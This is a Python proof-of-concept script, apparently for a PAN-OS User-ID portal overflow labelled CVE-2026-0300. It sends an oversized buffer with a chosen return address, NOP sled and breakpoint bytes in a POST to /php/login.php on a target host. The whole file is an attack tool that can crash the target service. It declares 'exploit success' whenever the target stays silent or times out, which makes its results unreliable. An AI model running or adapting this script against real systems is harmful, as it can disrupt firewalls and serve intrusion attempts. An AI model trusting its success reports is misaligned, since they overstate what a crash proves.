#!/usr/bin/env python3
import socket
import struct
import argparse
import sys
import time

# --- ANSI UI TOOLKIT ---
R = "\033[31m"  # Red
G = "\033[32m"  # Green
Y = "\033[33m"  # Yellow
B = "\033[34m"  # Blue
C = "\033[36m"  # Cyan
M = "\033[35m"  # Magenta
W = "\033[0m"   # Reset
BOLD = "\033[1m"

def print_banner():
    banner = f"""
{C}┌────────────────────────────────────────────────────────┐
│ {BOLD}{W}CVE-2026-0300: {R}PAN-OS User-ID Portal Research Tool{C}      │
│ {Y}Vulnerability: CWE-787 Out-of-bounds Write (RCE)       {C}│
└────────────────────────────────────────────────────────┘{W}
    """
    print(banner)

def loading_animation(duration=2):
    chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    end_time = time.time() + duration
    while time.time() < end_time:
        for char in chars:
            sys.stdout.write(f'\r{B}[{char}]{W} Processing...')
            sys.stdout.flush()
            time.sleep(0.1)
    sys.stdout.write('\r' + ' ' * 30 + '\r')

def print_status(icon, color, message):
    print(f"{color}[{icon}]{W} {message}")

def main():
    print_banner()
    parser = argparse.ArgumentParser(description="Professional PoC for CVE-2026-0300 Research")
    parser.add_argument("-t", "--target", required=True, help="Target IP Address")
    parser.add_argument("-p", "--port", type=int, default=6082, help="Port (Default: 6082)")
    parser.add_argument("-o", "--offset", type=int, default=2048, help="Buffer Offset")
    parser.add_argument("-r", "--ret", default="0xdeadbeef", help="Return Address (Hex)")
    args = parser.parse_args()

    print(f"{BOLD}{R}![SECURITY WARNING]: AUTHORIZED RESEARCH ONLY{W}\n")
    
    # Payload Construction
    print_status("*", B, "Constructing memory corruption buffer...")
    padding = b"A" * args.offset
    try:
        return_address = struct.pack("<Q", int(args.ret, 16))
    except Exception:
        print_status("!", R, "Critical: Invalid Return Address format!")
        sys.exit(1)
        
    payload = padding + return_address + (b"\x90" * 64) + (b"\xcc" * 128)
    
    request = (b"POST /php/login.php HTTP/1.1\r\n"
               b"Host: " + args.target.encode() + b"\r\n"
               b"Content-Type: application/x-www-form-urlencoded\r\n"
               b"Content-Length: " + str(len(payload)).encode() + b"\r\n\r\n" + payload)

    print(f"{M}───[ SESSION START ]───{W}")
    print_status("i", C, f"Target Node: {G}{args.target}:{args.port}{W}")
    
    try:
        loading_animation(1.5)
        with socket.create_connection((args.target, args.port), timeout=15) as s:
            print_status("+", G, "Handshake Successful! Connection established.")
            
            print_status(">", Y, "Injecting 0-day research payload into memory...")
            s.sendall(request)
            
            print_status("*", B, "Payload sent. Synchronizing with service state...")
            time.sleep(2)
            
            try:
                response = s.recv(1024)
                print(f"\n{BOLD}{C}┌─[ ANALYSIS RESULT ]{W}")
                if not response:
                    print(f"│ Status: {G}SUCCESS / POTENTIAL CRASH{W}")
                    print(f"│ Details: Service closed connection (Vulnerable state detected).")
                else:
                    print(f"│ Status: {Y}MITIGATED / PATCHED{W}")
                    print(f"│ Details: Server responded. Buffer may have been handled.")
                print(f"{C}└────────────────────{W}")
            except socket.timeout:
                print(f"\n{BOLD}{C}┌─[ ANALYSIS RESULT ]{W}")
                print(f"│ Status: {G}EXPLOIT SUCCESS (TIMEOUT){W}")
                print(f"│ Details: Target service crashed and is now unresponsive.")
                print(f"{C}└────────────────────{W}")

    except ConnectionRefusedError:
        print(f"\n{R}{BOLD}[X] ERROR: CONNECTION REFUSED{W}")
        print(f"[-] Root Cause: Port {args.port} is closed or service is offline.")
    except socket.timeout:
        print(f"\n{R}{BOLD}[X] ERROR: NETWORK TIMEOUT{W}")
        print(f"[-] Root Cause: Packet drop. Check firewall (WAF/ACL) settings.")
    except Exception as e:
        print(f"\n{R}[!] UNEXPECTED FAULT: {e}{W}")

    print(f"\n{M}───[ SESSION END ]───{W}")

if __name__ == "__main__":
    main()
